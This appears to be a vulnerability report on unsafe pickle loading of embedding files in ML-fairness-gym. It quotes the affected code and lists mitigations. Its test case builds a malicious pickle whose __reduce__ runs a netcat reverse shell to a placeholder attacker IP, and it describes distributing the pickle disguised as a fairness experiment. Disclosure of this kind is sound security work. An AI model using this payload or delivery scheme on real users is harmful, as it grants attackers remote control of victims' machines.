- vulnerability name: Pickle Deserialization Vulnerability
- description: A malicious actor could craft a pickle file containing malicious code and replace the legitimate embedding file used by the ML-fairness-gym. When a user loads a simulation environment that uses these embeddings, the `pickle.load` function will deserialize the malicious pickle file, leading to arbitrary code execution on the user's machine.
- impact: Critical. Arbitrary code execution on the user's machine. An attacker could gain full control of the user's system, steal sensitive data, or install malware.
- vulnerability rank: critical
- currently implemented mitigations: No mitigations are currently implemented in the project to prevent pickle deserialization vulnerabilities.
- missing mitigations:
    - Replace `pickle` with a safer serialization format like JSON or YAML for loading embedding data.
    - Implement input validation and sanitization for the embedding file path to ensure only trusted files are loaded.
    - Implement integrity checks for the embedding files to detect tampering.
- preconditions:
    - The user must download and use a maliciously crafted simulation environment that includes a malicious pickle file.
    - The user must run a simulation using this malicious environment.
- source code analysis:
    - File: `/code/environments/recommenders/movie_lens_utils.py`
    - Step 1: The function `load_embeddings(env_config)` is responsible for loading embedding data.
    - Step 2: Inside `load_embeddings`, the code determines the file type based on the suffix of `env_config.embeddings_path`.
    - Step 3: If the suffix is `.pkl` or `.pickle`, it uses `pickle.load` to deserialize the data from the file.
    ```python
    File: /code/environments/recommenders/movie_lens_utils.py
    82 def load_embeddings(env_config):
    ...
    89   suffix = pathlib.Path(path).suffix
    90   if suffix == '.json':
    91     loader = json
    92     logging.info('Reading a json file. %s', path)
    93   elif suffix in ('.pkl', '.pickle'):
    94     loader = pickle
    95     logging.info('Reading a pickle file. %s', path)
    96   else:
    97     raise ValueError('Unrecognized file type! %s' % path)
    98
    99   embedding_dict = loader.load(file_util.open(path, 'rb'))
    ```
    - Step 4: An attacker can replace the file specified by `env_config.embeddings_path` with a malicious pickle file.
    - Step 5: When the user runs a simulation using this environment, `pickle.load` will execute the malicious code embedded in the pickle file.

- security test case:
    - Step 1: Create a malicious pickle file (`malicious_embeddings.pkl`) containing code to execute a reverse shell or similar payload.
    ```python
    import pickle
    import os
    import socket

    class EvilPickle(object):
        def __reduce__(self):
            cmd = "nc -e /bin/bash <attacker_ip> <attacker_port>" # Replace with attacker's IP and port
            return (os.system, (cmd,))

    payload = EvilPickle()
    pickle.dump(payload, open("malicious_embeddings.pkl", "wb"))
    ```
    - Step 2: Create a malicious simulation environment configuration file or modify an existing one to point `embeddings_path` to `malicious_embeddings.pkl`.
    - Step 3: Distribute this malicious simulation environment to the victim, disguised as a legitimate fairness experiment.
    - Step 4: The victim downloads and runs the ML-fairness-gym framework with the malicious simulation environment.
    - Step 5: The ML-fairness-gym framework loads the malicious pickle file using `pickle.load` in `environments/recommenders/movie_lens_utils.py`.
    - Step 6: The malicious code in `malicious_embeddings.pkl` is executed, and the attacker gains a reverse shell on the victim's machine.
    - Step 7: Verify the vulnerability by checking for a connection on the attacker's listening port after the victim runs the simulation.